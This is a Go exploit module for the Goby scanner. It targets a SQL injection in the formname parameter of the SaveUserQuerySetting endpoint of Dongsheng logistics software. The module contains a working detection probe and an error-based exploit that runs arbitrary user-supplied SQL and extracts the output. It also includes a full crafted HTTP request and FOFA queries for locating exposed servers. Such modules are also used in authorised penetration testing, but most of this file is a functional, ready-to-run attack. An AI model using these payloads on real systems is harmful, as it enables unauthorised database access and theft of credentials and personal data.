package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dongsheng logistics software /MvcShipping/MsBaseInfo/SaveUserQuerySetting interface formname parameter SQL injection vulnerability",
    "Description": "<p>Dongsheng logistics software is a logistics management software that integrates order management, warehouse management, transportation management and other functions.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Product": "东胜物流软件",
    "Homepage": "http://www.dongshengsoft.com/",
    "DisclosureDate": "2023-03-06",
    "Author": "715827922@qq.com",
    "FofaQuery": "body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\"",
    "GobyQuery": "body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select @@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/MvcShipping/MsBaseInfo/SaveUserQuerySetting",
                "follow_redirect": true,
                "header": {
                    "Accept-Language": "zh-CN,zh;q=0.8",
                    "Accept": "*/*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info",
                    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
                    "Connection": "keep-alive",
                    "Referer": "http://www.baidu.com",
                    "Cache-Control": "max-age=0",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "formname=MsRptSaleBalProfitShareIndex' AND 1020 IN (select%20sys.fn_sqlvarbasetostr(hashbytes('MD5','5'))) AND 'XoPV'='XoPV&isvisible=true&issavevalue=true&querydetail={\"PS_MBLNO\":\"\",\"PS_VESSEL\":\"\",\"PS_VOYNO\":\"\",\"PS_SALE\":\"\\u91d1\\u78ca\",\"PS_OP\":null,\"PS_EXPDATEBGN\":\"2020-02-01\",\"PS_EXPDATEEND\":\"2020-02-29\",\"PS_STLDATEBGN\":\"\",\"PS_STLDATEEND\":\"\",\"PS_ACCDATEBGN\":\"\",\"PS_ACCDATEEND\":\"\",\"checkboxfield-1188-inputEl\":\"on\",\"PS_CUSTSERVICE\":null,\"PS_DOC\":null,\"hiddenfield-1206-inputEl\":\"\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e4da3b7fbbce2345d7772b0674a318d5",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/MvcShipping/MsBaseInfo/SaveUserQuerySetting",
                "follow_redirect": true,
                "header": {
                    "Accept-Language": "zh-CN,zh;q=0.8",
                    "Accept": "*/*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info",
                    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
                    "Connection": "keep-alive",
                    "Referer": "http://www.baidu.com",
                    "Cache-Control": "max-age=0",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "formname=MsRptSaleBalProfitShareIndex'+AND+2523+IN+(SELECT+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT+SUBSTRING((ISNULL(CAST({{{sql}}}+AS+NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)))+AND+'uKco'%3d'uKco&isvisible=true&issavevalue=true&querydetail=%7B%22PS_MBLNO%22%3A%22%22%2C%22PS_VESSEL%22%3A%22%22%2C%22PS_VOYNO%22%3A%22%22%2C%22PS_SALE%22%3A%22%5Cu91d1%5Cu78ca%22%2C%22PS_OP%22%3Anull%2C%22PS_EXPDATEBGN%22%3A%222020-02-01%22%2C%22PS_EXPDATEEND%22%3A%222020-02-29%22%2C%22PS_STLDATEBGN%22%3A%22%22%2C%22PS_STLDATEEND%22%3A%22%22%2C%22PS_ACCDATEBGN%22%3A%22%22%2C%22PS_ACCDATEEND%22%3A%22%22%2C%22checkboxfield-1188-inputEl%22%3A%22on%22%2C%22PS_CUSTSERVICE%22%3Anull%2C%22PS_DOC%22%3Anull%2C%22hiddenfield-1206-inputEl%22%3A%22%22%7D"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "qxpqq(.*)qzkqq",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|qxpqq(.*)qzkqq"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "东胜物流软件 /MvcShipping/MsBaseInfo/SaveUserQuerySetting 接口 formname 参数 SQL 注入漏洞",
            "Product": "东胜物流软件",
            "Description": "<p>东胜物流软件是一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dongsheng logistics software /MvcShipping/MsBaseInfo/SaveUserQuerySetting interface formname parameter SQL injection vulnerability",
            "Product": "东胜物流软件",
            "Description": "<p>Dongsheng logistics software is a logistics management software that integrates order management, warehouse management, transportation management and other functions.<br></p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.dongshengsoft.com/\">http://www.dongshengsoft.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-04",
    "PocId": "10834"
}`
	postSqlInjectionParams2309Iausdl := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/MvcShipping/MsBaseInfo/SaveUserQuerySetting")
		postRequestConfig.FollowRedirect = false
		postRequestConfig.VerifyTls = false
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		if len(payload) < 1 {
			payload = "formname=MsRptSaleBalProfitShareIndex' AND 1020 IN (select%20sys.fn_sqlvarbasetostr(hashbytes('MD5','5'))) AND 'XoPV'='XoPV&isvisible=true&issavevalue=true&querydetail={\"PS_MBLNO\":\"\",\"PS_VESSEL\":\"\",\"PS_VOYNO\":\"\",\"PS_SALE\":\"\\u91d1\\u78ca\",\"PS_OP\":null,\"PS_EXPDATEBGN\":\"2020-02-01\",\"PS_EXPDATEEND\":\"2020-02-29\",\"PS_STLDATEBGN\":\"\",\"PS_STLDATEEND\":\"\",\"PS_ACCDATEBGN\":\"\",\"PS_ACCDATEEND\":\"\",\"checkboxfield-1188-inputEl\":\"on\",\"PS_CUSTSERVICE\":null,\"PS_DOC\":null,\"hiddenfield-1206-inputEl\":\"\"}"
		}
		postRequestConfig.Data = payload
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			response, err := postSqlInjectionParams2309Iausdl(hostInfo, "")
			if err != nil {
				return false
			}
			return response.StatusCode == 200 && strings.Contains(response.Utf8Html, "0xe4da3b7fbbce2345d7772b0674a318d5")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			sql := goutils.B2S(ss.Params["sql"])
			if attackType == "sql" {
				payload := "formname=MsRptSaleBalProfitShareIndex'+AND+2523+IN+(SELECT+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT+SUBSTRING((ISNULL(CAST((" + url.QueryEscape(sql) + ")+AS+NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)))+AND+'uKco'%3d'uKco&isvisible=true&issavevalue=true&querydetail=%7B%22PS_MBLNO%22%3A%22%22%2C%22PS_VESSEL%22%3A%22%22%2C%22PS_VOYNO%22%3A%22%22%2C%22PS_SALE%22%3A%22%5Cu91d1%5Cu78ca%22%2C%22PS_OP%22%3Anull%2C%22PS_EXPDATEBGN%22%3A%222020-02-01%22%2C%22PS_EXPDATEEND%22%3A%222020-02-29%22%2C%22PS_STLDATEBGN%22%3A%22%22%2C%22PS_STLDATEEND%22%3A%22%22%2C%22PS_ACCDATEBGN%22%3A%22%22%2C%22PS_ACCDATEEND%22%3A%22%22%2C%22checkboxfield-1188-inputEl%22%3A%22on%22%2C%22PS_CUSTSERVICE%22%3Anull%2C%22PS_DOC%22%3Anull%2C%22hiddenfield-1206-inputEl%22%3A%22%22%7D}"
				response, err := postSqlInjectionParams2309Iausdl(expResult.HostInfo, payload)
				if err != nil || response.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				re := regexp.MustCompile(`qxpqq(.*?)qzkqq`)
				matches := re.FindStringSubmatch(response.Utf8Html)
				if len(matches) >= 2 {
					expResult.Success = true
					matchedText := matches[1]
					expResult.Output = matchedText
				}
			} else if attackType == "sqlpoint" {
				response, err := postSqlInjectionParams2309Iausdl(expResult.HostInfo, "")
				if err != nil || !(response.StatusCode == 200 && strings.Contains(response.Utf8Html, "0xe4da3b7fbbce2345d7772b0674a318d5")) {
					expResult.Success = false
					expResult.Output = "不存在注入点"
					return expResult
				}
				expResult.Success = true
				expResult.Output = `POST /MvcShipping/MsBaseInfo/SaveUserQuerySetting HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 815
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Connection: close

formname=MsRptSaleBalProfitShareIndex'+AND+2523+IN+(SELECT+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT+SUBSTRING((ISNULL(CAST(db_name()+AS+NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)))+AND+'uKco'%3d'uKco&isvisible=true&issavevalue=true&querydetail=%7B%22PS_MBLNO%22%3A%22%22%2C%22PS_VESSEL%22%3A%22%22%2C%22PS_VOYNO%22%3A%22%22%2C%22PS_SALE%22%3A%22%5Cu91d1%5Cu78ca%22%2C%22PS_OP%22%3Anull%2C%22PS_EXPDATEBGN%22%3A%222020-02-01%22%2C%22PS_EXPDATEEND%22%3A%222020-02-29%22%2C%22PS_STLDATEBGN%22%3A%22%22%2C%22PS_STLDATEEND%22%3A%22%22%2C%22PS_ACCDATEBGN%22%3A%22%22%2C%22PS_ACCDATEEND%22%3A%22%22%2C%22checkboxfield-1188-inputEl%22%3A%22on%22%2C%22PS_CUSTSERVICE%22%3Anull%2C%22PS_DOC%22%3Anull%2C%22hiddenfield-1206-inputEl%22%3A%22%22%7D`
			}
			return expResult
		},
	))
}
